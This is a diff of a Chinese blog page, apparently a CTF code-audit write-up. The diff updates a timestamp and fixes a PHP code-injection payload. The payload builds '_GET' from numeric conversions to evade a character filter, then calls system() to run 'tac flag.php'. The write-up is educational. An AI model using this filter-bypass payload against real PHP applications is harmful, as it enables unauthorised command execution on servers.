@@ -23,7 +23,7 @@
 <meta property="og:image" content="https://ws3.sinaimg.cn/large/006Xmmmggy1g62geuwux9j30z40cygnd.jpg">
 <meta property="og:image" content="https://ws3.sinaimg.cn/large/006Xmmmggy1g62kn2agrnj30ya02umx3.jpg">
 <meta property="og:image" content="https://ws3.sinaimg.cn/large/006Xmmmggy1g62knm3xg8j30oy0j6gmq.jpg">
-<meta property="og:updated_time" content="2019-09-09T10:33:17.091Z">
+<meta property="og:updated_time" content="2019-09-10T09:50:12.829Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="几道代码审计题">
 <meta name="twitter:description" content="代码审计">
@@ -321,7 +321,7 @@
 <p>echo hexdec(hexdec(bin2hex(‘_GET’)))</p>
 <p>=&gt; 1598506324</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php</span><br><span class="line">=&gt;</span><br><span class="line">?$pi=hex2bin(5f474554)</span><br><span class="line">相当于</span><br><span class="line">$pi=_GET;</span><br><span class="line"></span><br><span class="line">($_GET[pi])($_GET[abs])</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php</span><br><span class="line">=&gt;</span><br><span class="line">?$pi=hex2bin(5f474554)</span><br><span class="line">相当于</span><br><span class="line">$pi=_GET;</span><br><span class="line"></span><br><span class="line">($_GET[pi])($_GET[abs])</span><br></pre></td></tr></table></figure>
 
 <p>这里有用到一个trick，就是使用 <strong>{}</strong> 来代替 <strong>[]</strong> 进行数组索引</p>
 <p><a href="https://www.php.net/manual/en/language.types.array.php#language.types.array.syntax.accessing" target="_blank" rel="noopener">https://www.php.net/manual/en/language.types.array.php#language.types.array.syntax.accessing</a></p>
